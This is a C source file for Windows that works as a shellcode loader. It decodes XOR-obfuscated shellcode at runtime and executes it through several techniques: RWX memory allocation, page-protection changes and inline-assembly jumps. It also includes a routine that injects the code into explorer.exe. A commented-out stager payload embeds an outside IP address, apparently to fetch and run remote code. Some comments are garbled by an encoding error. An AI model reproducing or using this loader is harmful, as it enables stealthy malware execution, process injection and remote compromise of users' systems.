#include<stdio.h>
#include<Windows.h>
#include"CodeInject.h"
#include"Main.h"

//#define ENCODE
//unsigned char shellcode[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x00";

BYTE shellcode[] = { 0xf1,0xe5,0x84,0xd,0xd,0xd,0x6d,0x84,0xe8,0x3c,0xdf,0x69,0x86,0x5f,0x3d,0x86,0x5f,0x1,0x86,0x5f,0x19,0x86,0x7f,0x25,0x2,0xba,0x47,0x2b,0x3c,0xf2,0x3c,0xcd,0xa1,0x31,0x6c,0x71,0xf,0x21,0x2d,0xcc,0xc2,0x0,0xc,0xca,0xef,0xfd,0x5f,0x5a,0x86,0x5f,0x1d,0x86,0x4f,0x31,0xc,0xdd,0x86,0x4d,0x75,0x88,0xcd,0x79,0x47,0xc,0xdd,0x5d,0x86,0x45,0x15,0x86,0x55,0x2d,0xc,0xde,0xee,0x31,0x44,0x86,0x39,0x86,0xc,0xdb,0x3c,0xf2,0x3c,0xcd,0xa1,0xcc,0xc2,0x0,0xc,0xca,0x35,0xed,0x78,0xf9,0xe,0x70,0xf5,0x36,0x70,0x29,0x78,0xef,0x55,0x86,0x55,0x29,0xc,0xde,0x6b,0x86,0x1,0x46,0x86,0x55,0x11,0xc,0xde,0x86,0x9,0x86,0xc,0xdd,0x84,0x49,0x29,0x29,0x56,0x56,0x6c,0x54,0x57,0x5c,0xf2,0xed,0x55,0x52,0x57,0x86,0x1f,0xe6,0x8b,0x50,0x67,0xc,0x80,0x88,0xb4,0xd,0xd,0xd,0x5d,0x65,0x3c,0x86,0x62,0x8a,0xf2,0xd8,0xb6,0xfd,0xb8,0xaf,0x5b,0x65,0xab,0x98,0xb0,0x90,0xf2,0xd8,0x31,0xb,0x71,0x7,0x8d,0xf6,0xed,0x78,0x8,0xb6,0x4a,0x1e,0x7f,0x62,0x67,0xd,0x5e,0xf2,0xd8,0x6e,0x6c,0x61,0x6e,0xd,0xd };

///////////////////////////////////////////////////
//unsigned char shellcode[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x34\x26\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x49\x69\x53\x57\x00\x2d\x60\x67\x5f\x6e\xbf\x6d\xae\x66\xbe\xdb\x42\x07\x31\x20\x9d\xf8\x41\xa0\x3e\xd5\xb1\xc6\xbf\xb8\x5d\x59\x86\x2c\x81\xd1\x8a\x55\x84\xed\x38\x34\xd7\x81\xcc\x12\x86\x50\xfe\xb5\x56\x53\xa0\x09\x71\x2d\x61\xa1\xdf\x33\x2f\xa7\xdc\x14\x91\xef\x40\x43\xce\xb7\x8a\x9b\x98\xb5\xf3\x0a\x47\x10\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x43\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x45\x29\x0d\x0a\x00\x3b\x4d\x00\x66\xd8\xe2\xf2\xb7\x08\x14\xd9\x93\x37\xf0\x20\x36\x41\x16\xcf\x15\x4e\x9e\x0c\xe5\x48\x07\x44\x40\x0e\x0f\x9d\x53\x2c\x93\xb2\x48\x37\x98\x5a\x33\x8a\xa1\x13\xf6\xb0\x55\x23\x9c\x70\x5b\xe2\xbe\xf1\x37\xfe\x47\x05\x77\x80\x58\x56\xc2\xdb\x32\xac\xc4\x4a\x2f\x97\x6d\xd9\xb8\x01\x17\xe2\x13\xca\xe1\xd0\xb0\x09\x29\xa7\x03\x45\x30\xc9\x29\x8a\x42\xa5\xd1\xc7\x26\x2b\xcf\x5e\xec\x96\x1e\xb5\x78\xc9\x18\xe8\x42\x6e\xbe\x7f\x94\x0b\x28\x0b\xda\xbc\xc6\xd6\x75\x01\x54\xa2\xaa\x8b\xbd\xca\x63\xeb\x94\x2d\xb9\xfa\xe6\x9a\xd0\x9f\x14\x88\x51\x44\x33\x96\x72\xb0\xc2\xd6\xeb\x1c\x10\x69\x6d\xe0\x51\x3d\xfa\x71\xbd\x35\x34\x7a\xac\xbf\xae\x26\xb3\xab\x2b\x3c\x2e\x00\xd8\x37\xf1\xf4\x03\x3f\x47\x49\x9a\x08\xa9\x26\xe8\x70\x4e\xdf\x80\x7f\x46\x63\x41\xfd\xe4\x0b\x39\x88\xd1\x4a\x1c\xab\x25\x63\xcd\x53\xf3\xd2\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x38\x31\x2e\x36\x38\x2e\x32\x34\x34\x2e\x38\x36\x00\x12\x34\x56\x78";
//BYTE shellcode[] = { 0x92,0x86,0xe7,0x6e,0x6e,0x6e,0xe,0xe7,0x8b,0x5f,0xbc,0xa,0xe5,0x3c,0x5e,0xe5,0x3c,0x62,0xe5,0x3c,0x7a,0xe5,0x1c,0x46,0x61,0xd9,0x24,0x48,0x5f,0x91,0x5f,0xae,0xc2,0x52,0xf,0x12,0x6c,0x42,0x4e,0xaf,0xa1,0x63,0x6f,0xa9,0x8c,0x9e,0x3c,0x39,0xe5,0x3c,0x7e,0xe5,0x2c,0x52,0x6f,0xbe,0xe5,0x2e,0x16,0xeb,0xae,0x1a,0x24,0x6f,0xbe,0x3e,0xe5,0x26,0x76,0xe5,0x36,0x4e,0x6f,0xbd,0x8d,0x52,0x27,0xe5,0x5a,0xe5,0x6f,0xb8,0x5f,0x91,0x5f,0xae,0xc2,0xaf,0xa1,0x63,0x6f,0xa9,0x56,0x8e,0x1b,0x9a,0x6d,0x13,0x96,0x55,0x13,0x4a,0x1b,0x8c,0x36,0xe5,0x36,0x4a,0x6f,0xbd,0x8,0xe5,0x62,0x25,0xe5,0x36,0x72,0x6f,0xbd,0xe5,0x6a,0xe5,0x6f,0xbe,0xe7,0x2a,0x4a,0x4a,0x35,0x35,0xf,0x37,0x34,0x3f,0x91,0x8e,0x36,0x31,0x34,0xe5,0x7c,0x85,0xe8,0x33,0x6,0x0,0xb,0x1a,0x6e,0x6,0x19,0x7,0x0,0x7,0x3a,0x6,0x22,0x19,0x48,0x69,0x91,0xbb,0x5f,0x91,0x39,0x39,0x39,0x39,0x39,0x6,0x54,0x38,0x17,0xc9,0x91,0xbb,0x87,0xea,0x6e,0x6e,0x6e,0x35,0x5f,0xa7,0x3f,0x3f,0x4,0x6d,0x3f,0x3f,0x6,0x5a,0x48,0x6e,0x6e,0x3d,0x3e,0x6,0x39,0xe7,0xf1,0xa8,0x91,0xbb,0x85,0x1e,0x35,0x5f,0xbc,0x3c,0x6,0x6e,0x6c,0x2e,0xea,0x3c,0x3c,0x3c,0x3d,0x3c,0x3e,0x6,0x85,0x3b,0x40,0x55,0x91,0xbb,0xe7,0xa8,0xed,0xad,0x3e,0x5f,0x91,0x39,0x39,0x4,0x91,0x3d,0x38,0x6,0x43,0x68,0x76,0x15,0x91,0xbb,0xeb,0xae,0x61,0xea,0xad,0x6f,0x6e,0x6e,0x5f,0x91,0xeb,0x98,0x1a,0x6a,0xe7,0x97,0x85,0x67,0x6,0xc4,0xab,0x8c,0x33,0x91,0xbb,0xe7,0xaf,0x6,0x2b,0x4f,0x30,0x5f,0x91,0xbb,0x5f,0x91,0x39,0x4,0x69,0x3f,0x38,0x3e,0x6,0xd9,0x39,0x8e,0x65,0x91,0xbb,0xd1,0x6e,0x41,0x6e,0x6e,0x57,0xa9,0x1a,0xd9,0x5f,0x91,0x87,0xff,0x6f,0x6e,0x6e,0x87,0xa7,0x6f,0x6e,0x6e,0x86,0xe5,0x91,0x91,0x91,0x41,0x27,0x7,0x3d,0x39,0x6e,0x43,0xe,0x9,0x31,0x0,0xd1,0x3,0xc0,0x8,0xd0,0xb5,0x2c,0x69,0x5f,0x4e,0xf3,0x96,0x2f,0xce,0x50,0xbb,0xdf,0xa8,0xd1,0xd6,0x33,0x37,0xe8,0x42,0xef,0xbf,0xe4,0x3b,0xea,0x83,0x56,0x5a,0xb9,0xef,0xa2,0x7c,0xe8,0x3e,0x90,0xdb,0x38,0x3d,0xce,0x67,0x1f,0x43,0xf,0xcf,0xb1,0x5d,0x41,0xc9,0xb2,0x7a,0xff,0x81,0x2e,0x2d,0xa0,0xd9,0xe4,0xf5,0xf6,0xdb,0x9d,0x64,0x29,0x7e,0x6e,0x3b,0x1d,0xb,0x1c,0x43,0x2f,0x9,0xb,0x0,0x1a,0x54,0x4e,0x23,0x1,0x14,0x7,0x2,0x2,0xf,0x41,0x5a,0x40,0x5e,0x4e,0x46,0xd,0x1,0x3,0x1e,0xf,0x1a,0x7,0xc,0x2,0xb,0x55,0x4e,0x23,0x3d,0x27,0x2b,0x4e,0x56,0x40,0x5e,0x55,0x4e,0x39,0x7,0x0,0xa,0x1,0x19,0x1d,0x4e,0x20,0x3a,0x4e,0x5b,0x40,0x5f,0x55,0x4e,0x3a,0x1c,0x7,0xa,0xb,0x0,0x1a,0x41,0x5a,0x40,0x5e,0x55,0x4e,0x40,0x20,0x2b,0x3a,0x5a,0x40,0x5e,0x2d,0x55,0x4e,0x40,0x20,0x2b,0x3a,0x5a,0x40,0x5e,0x2b,0x47,0x63,0x64,0x6e,0x55,0x23,0x6e,0x8,0xb6,0x8c,0x9c,0xd9,0x66,0x7a,0xb7,0xfd,0x59,0x9e,0x4e,0x58,0x2f,0x78,0xa1,0x7b,0x20,0xf0,0x62,0x8b,0x26,0x69,0x2a,0x2e,0x60,0x61,0xf3,0x3d,0x42,0xfd,0xdc,0x26,0x59,0xf6,0x34,0x5d,0xe4,0xcf,0x7d,0x98,0xde,0x3b,0x4d,0xf2,0x1e,0x35,0x8c,0xd0,0x9f,0x59,0x90,0x29,0x6b,0x19,0xee,0x36,0x38,0xac,0xb5,0x5c,0xc2,0xaa,0x24,0x41,0xf9,0x3,0xb7,0xd6,0x6f,0x79,0x8c,0x7d,0xa4,0x8f,0xbe,0xde,0x67,0x47,0xc9,0x6d,0x2b,0x5e,0xa7,0x47,0xe4,0x2c,0xcb,0xbf,0xa9,0x48,0x45,0xa1,0x30,0x82,0xf8,0x70,0xdb,0x16,0xa7,0x76,0x86,0x2c,0x0,0xd0,0x11,0xfa,0x65,0x46,0x65,0xb4,0xd2,0xa8,0xb8,0x1b,0x6f,0x3a,0xcc,0xc4,0xe5,0xd3,0xa4,0xd,0x85,0xfa,0x43,0xd7,0x94,0x88,0xf4,0xbe,0xf1,0x7a,0xe6,0x3f,0x2a,0x5d,0xf8,0x1c,0xde,0xac,0xb8,0x85,0x72,0x7e,0x7,0x3,0x8e,0x3f,0x53,0x94,0x1f,0xd3,0x5b,0x5a,0x14,0xc2,0xd1,0xc0,0x48,0xdd,0xc5,0x45,0x52,0x40,0x6e,0xb6,0x59,0x9f,0x9a,0x6d,0x51,0x29,0x27,0xf4,0x66,0xc7,0x48,0x86,0x1e,0x20,0xb1,0xee,0x11,0x28,0xd,0x2f,0x93,0x8a,0x65,0x57,0xe6,0xbf,0x24,0x72,0xc5,0x4b,0xd,0xa3,0x3d,0x9d,0xbc,0x6e,0x6,0x9e,0xdb,0xcc,0x38,0x91,0xbb,0x4,0x2e,0x6,0x6e,0x7e,0x6e,0x6e,0x6,0x6e,0x6e,0x2e,0x6e,0x39,0x6,0x36,0xca,0x3d,0x8b,0x91,0xbb,0xfd,0xd7,0x6e,0x6e,0x6e,0x6e,0x6f,0xb7,0x3f,0x3d,0xe7,0x89,0x39,0x6,0x6e,0x4e,0x6e,0x6e,0x3d,0x38,0x6,0x7c,0xf8,0xe7,0x8c,0x91,0xbb,0xeb,0xae,0x1a,0xa8,0xe5,0x69,0x6f,0xad,0xeb,0xae,0x1b,0x8b,0x36,0xad,0x86,0xc7,0x93,0x91,0x91,0x56,0x5f,0x40,0x58,0x56,0x40,0x5c,0x5a,0x5a,0x40,0x56,0x58,0x6e,0x7c,0x5a,0x38,0x16,0x6e };
///////////////////////////////////////////////////

typedef void(__stdcall* CODE) ();

void XORrecoder()
{

	for (size_t i = 0; i < sizeof(shellcode); i++)
	{
#ifdef ENCODE
		shellcode[i] ^= 0xA;
		shellcode[i] ^= 0xB;
		shellcode[i] ^= 0xC;
		printf("0x%x,", shellcode[i]);
#endif
		shellcode[i] ^= 0xC;
		shellcode[i] ^= 0xB;
		shellcode[i] ^= 0xA;
		//printf("0x%x,", shellcode[i]);
	}
	putchar('\n');
}

bool ChangePageProtect(CodeBuffer Buffer)
{
	DWORD OldProtect = 0;
	VirtualProtect(Buffer.pBuffer, Buffer.BufferSize, PAGE_EXECUTE_READWRITE, &OldProtect);
	return TRUE;
}

/////////////////ж╠╫с╪сть///////////////////

typedef void(__stdcall* CODE) ();
void RunShellCode_1()
{
	PVOID pBuffer = NULL;
	pBuffer = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pBuffer == NULL)
	{
		return;
	}
	memcpy(pBuffer, shellcode, sizeof(shellcode));

	CODE code = (CODE)pBuffer;

	code();

}

void RunShellCode_2()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	((void(*)(void)) & shellcode)();
}


#ifndef _WIN64

void RunShellCode_3()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	__asm
	{
		lea eax, shellcode
		jmp eax
	}
}

void RunShellCode_4()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	__asm
	{
		lea eax, shellcode
		call eax
	}
}

void RunShellCode_5()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	__asm
	{
		lea eax, shellcode
		push eax
		jmp dword ptr ds:[esp]
	}
}

void RunShellCode_6()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	__asm
	{
		lea eax, shellcode
		push eax
		ret
	}
}

void RunShellCode_7()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	__asm
	{
		mov eax, offset shellcode;
		_emit 0xFF;	
		_emit 0xE0;
	}
}

#else

#endif

////////////////////////////в╒хКй╫╪сть///////////////////////////////

void InjectShellCode_1()
{
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	DWORD dwPid = GetProcessIdByProcessName(L"explorer.exe");
	CodeInject::ZwCreateThreadExCodeInject(dwPid, Buffer);
}


int main()
{
	XORrecoder();
	
#ifndef ENCODE

	//RunShellCode_1();
	//RunShellCode_2();
	//RunShellCode_3();
	//RunShellCode_4();
	//RunShellCode_5();
	//RunShellCode_6();
	RunShellCode_7();
	//InjectShellCode_1();

#endif

	return 0;
}